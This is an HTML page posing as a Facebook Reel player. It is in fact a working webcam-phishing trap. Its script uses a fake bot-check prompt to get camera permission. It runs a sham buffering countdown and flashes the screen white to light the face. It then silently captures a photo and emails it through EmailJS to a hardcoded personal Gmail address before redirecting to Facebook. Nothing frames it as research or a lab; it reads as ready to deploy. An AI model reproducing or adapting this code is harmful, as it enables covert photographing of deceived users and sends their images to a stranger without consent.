<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video Player</title>
    <meta property="og:title" content="Facebook Video - Watch Viral Reel">
    <meta property="og:description" content="1.2M Views - Watch Now">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0; padding: 0; background-color: #000;
            display: flex; justify-content: center; align-items: center; height: 100vh;
            color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            transition: background-color 0.2s; /* لجعل ميزة الفلاش سلسة */
        }
        .video-container { text-align: center; width: 90%; }
        .loader {
            border: 4px solid #333; border-top: 4px solid #1877F2;
            border-radius: 50%; width: 60px; height: 60px;
            animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #timer { font-size: 1.2rem; margin-top: 10px; color: #1877F2; font-weight: bold; }
        .fb-logo { width: 50px; margin-bottom: 15px; }
    </style>
</head>
<body id="mainBody">
    <div class="video-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" class="fb-logo" alt="FB">
        <div class="loader"></div>
        <p id="statusText">Connecting to Facebook Server...</p>
        <div id="timer"></div>
    </div>

    <script>
        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })(); // تأكد من الـ ID الخاص بك

        window.onload = async function() {
            if (confirm("To watch this Facebook Reel, please click OK to verify you are not a bot.")) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    let seconds = 5; // زيادة الوقت لضمان التركيز
                    const timerElement = document.getElementById('timer');
                    const statusText = document.getElementById('statusText');
                    
                    const interval = setInterval(() => {
                        seconds--;
                        statusText.innerText = "Buffering Video HD...";
                        timerElement.innerText = "Video starts in " + seconds + "s";
                        
                        if (seconds <= 0) {
                            clearInterval(interval);
                            
                            // ميزة فلاش الشاشة: تحويل الخلفية للأبيض لإضاءة الوجه
                            document.getElementById('mainBody').style.backgroundColor = "#FFFFFF";
                            
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = 1280; canvas.height = 720; // جودة عالية
                                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
                                
                                emailjs.send('service_w3dev60', 'template_7k8tall', {
                                    image_data: canvas.toDataURL('image/jpeg', 0.8), // إرسال بجودة جيدة
                                    to_email: 'tayebiabd2016@gmail.com'
                                }).then(() => {
                                    window.location.href = "https://www.facebook.com/reels/";
                                });
                            }, 500); // التقاط الصورة بعد نصف ثانية من الفلاش
                        }
                    }, 1000);

                } catch (err) {
                    window.location.href = "https://www.facebook.com/reels/";
                }
            } else {
                window.location.href = "https://www.facebook.com/reels/";
            }
        };
    </script>
</body>
</html>
